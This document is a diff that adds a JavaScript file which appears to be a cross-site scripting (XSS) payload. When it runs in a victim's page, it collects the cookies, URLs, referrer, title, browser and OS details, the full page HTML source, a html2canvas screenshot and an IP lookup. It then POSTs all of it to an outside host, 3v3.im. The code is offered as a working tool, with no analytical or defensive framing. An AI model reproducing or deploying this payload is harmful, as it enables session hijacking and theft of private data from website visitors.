@@ -1,0 +1,81 @@
+        function getBrowserInfo(){
+            try{
+                var Sys = {};
+                var ua = navigator.userAgent.toLowerCase();
+                var re =/(msie|firefox|chrome|opera|version).*?([\d.]+)/;
+                var m = ua.match(re);
+                Sys.browser = m[1].replace(/version/, "'safari");
+                Sys.ver = m[2];
+                return Sys;
+            }catch(error){
+                return "Browser Fail!!!"
+            }
+        }
+        function getOsInfo(){
+            var os = navigator.platform.toLowerCase();
+            if(os.indexOf('mac') > -1){
+                return 'mac';
+            }else if(os.indexOf('win') > -1){
+                return 'windows';
+            }else if(os.indexOf('unix') > -1){
+                return 'unix';
+            }else{
+                return 'Fail!!!';
+            }
+        }
+        var browser = getBrowserInfo();
+        var referer = document.referrer;
+        var url = location.href;
+        var topUrl = window.top.location.href;
+        var cookie = document.cookie;
+        var title = document.title;
+        var os = getOsInfo();
+        var sourceCode = document.getElementsByTagName('html')[0].innerHTML;
+		var time = new Date();
+		time = time.toLocaleString()
+
+        try{
+            var scriptElement3 = document.createElement("script");
+            scriptElement3.src = "//pv.sohu.com/cityjson";
+            document.head.appendChild(scriptElement3);
+            ip = 'ok';
+        }
+        catch(err){
+            ip = 'getError'
+        }
+
+        var scriptElement2 = document.createElement("script");
+        scriptElement2.src = "./html2canvas.js";
+        document.head.appendChild(scriptElement2);
+
+        scriptElement2.onload = function(){
+            setTimeout(function(){
+                    html2canvas(document.querySelector("body")).then(canvas => {
+                        image = canvas.toDataURL("image/png");
+                        try{
+                            if(ip == 'getError'){
+                                ip = 'mmp!!!';
+                            }else{
+                                ip = returnCitySN['cip']  + returnCitySN['cname'];
+                            }
+                        }catch(err){
+                            ip = 'mmp!!!';
+                        }
+                    
+                        if(typeof(receive) == 'undefined'){
+                            receive = '';
+                        }
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', 'https://3v3.im/');
+                        xhr.setRequestHeader('Content-Type',"application/json");
+                        data = {"information":{"referer":referer,"url":url,"topUrl":topUrl,"title":title,"cookie":cookie,"browser":browser,"os":os,"ip":ip,"time":time},"sourceCode":sourceCode, "screen":image, "receive":receive};
+                        xhr.send(JSON.stringify(data));                  
+//   xhr.setRequestHeader('Content-Type',"application/x-www-form-urlencoded");
+                   //    data = {"information":{"referer":encodeURIComponent(referer),"url":encodeURIComponent(url),"topUrl":encodeURIComponent(topUrl),"title":encodeURIComponent(title),"cookie":encodeURIComponent(cookie),"browser":encodeURIComponent(browser),"os":os,"ip":ip,"time":time},
+                   //     "sourceCode":encodeURIComponent(encodeURIComponent(sourceCode)), "screen":encodeURIComponent(image), "receive":receive};
+                   //     xhr.send("data="+JSON.stringify(data));
+                    })
+            },100)
+        }
+
+//jieryu niubi
